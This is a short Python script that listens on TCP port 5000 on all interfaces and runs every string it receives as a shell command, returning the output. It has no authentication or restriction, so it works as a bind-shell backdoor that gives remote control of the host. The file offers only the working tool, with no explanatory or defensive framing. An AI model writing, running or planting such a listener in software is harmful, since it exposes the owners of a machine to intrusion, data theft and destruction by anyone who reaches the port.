import socket
import subprocess

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 5000))
    server.listen(1)
    print("Server is listening...")

    conn, addr = server.accept()
    print(f"Connection from {addr}")
    
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = subprocess.check_output(command, shell=True)
            conn.send(output)
        except Exception as e:
            conn.send(str(e).encode())

    conn.close()
    server.close()

if __name__ == "__main__":
    start_server()
